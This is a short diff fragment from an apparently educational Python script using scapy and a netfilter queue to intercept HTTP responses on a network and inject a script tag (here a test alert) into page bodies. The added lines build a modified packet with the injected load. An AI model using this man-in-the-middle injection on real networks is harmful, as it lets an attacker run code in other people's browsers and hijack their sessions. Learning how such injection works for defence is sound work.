@@ -28,6 +28,9 @@ def process_packet(packet):
             print("[+] Response")
 #in the captured packet replace the body in the load field with a script
             modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
+#create new packet by replacing captured scapy_packet with the new modified load
+            new_packet = set_load(scapy_packet, modified_load)
+
     packet.accept()
 
 #create instance of queue
